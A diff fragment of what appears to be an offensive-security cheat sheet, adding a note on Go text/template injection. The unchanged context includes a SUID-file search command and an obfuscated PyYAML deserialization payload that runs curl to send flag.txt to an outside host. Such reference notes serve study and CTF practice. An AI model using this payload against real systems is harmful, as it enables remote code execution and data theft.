@@ -452,3 +452,6 @@ find / -perm -u=s -type f 2>/dev/null
           args: ["z", !!python/tuple [], {"extend": !!python/name:exec }]
           listitems: "\x5f\x5fimport\x5f\x5f('os')\x2esystem('curl -POST mil1\x2eml/jm9 -F x=@flag\x2etxt')"
         ```
+- Golang `text/template`
+    - e.g. `"addressee": "world, oops: true"`
+    - [GitHub \- google/safetext](https://github.com/google/safetext)
